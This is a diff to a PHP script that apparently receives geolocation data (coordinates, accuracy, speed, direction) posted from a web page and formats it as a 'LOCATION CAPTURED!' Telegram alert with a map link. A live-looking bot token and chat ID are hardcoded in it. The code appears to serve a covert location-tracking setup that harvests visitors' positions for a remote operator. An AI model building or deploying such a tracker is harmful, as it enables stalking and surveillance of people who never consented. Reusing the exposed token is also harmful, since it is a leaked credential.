@@ -6,7 +6,7 @@ $botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM"; // Paste your 8386
 $chatId = "-1003598938463";     // Paste your -100... ID here
 // ******************************************
 
-// Receive Data (Matches keys in location.js)
+// Receive Data
 $lat = $_POST['Lat'];
 $lon = $_POST['Lon'];
 $acc = $_POST['Acc'];
@@ -20,10 +20,11 @@ $googleMapsLink = "https://www.google.com/maps/place/" . $lat . "+" . $lon;
 
 // Format Message
 $message = "<b>📍 LOCATION CAPTURED!</b>\n\n";
-$message .= "<b>🌎 Latitude:</b> " . $lat . "\n";
-$message .= "<b>🌎 Longitude:</b> " . $lon . "\n";
-$message .= "<b>🎯 Accuracy:</b> " . $acc . "\n";
-$message .= "<b>🏔 Altitude:</b> " . $alt . "\n"; // Will now just say "Sea Level"
+// Added <code> tags below to make them clickable/copyable
+$message .= "<b>🌎 Latitude:</b> <code>" . $lat . "</code>\n";
+$message .= "<b>🌎 Longitude:</b> <code>" . $lon . "</code>\n";
+$message .= "<b>🎯 Accuracy:</b> <code>" . $acc . "</code>\n";
+$message .= "<b>🏔 Altitude:</b> " . $alt . "\n"; 
 $message .= "<b>🧭 Direction:</b> " . $dir . "\n";
 $message .= "<b>🚗 Speed:</b> " . $spd . "\n\n";
 $message .= "<b>🗺 <a href='" . $googleMapsLink . "'>Open in Google Maps</a></b>";
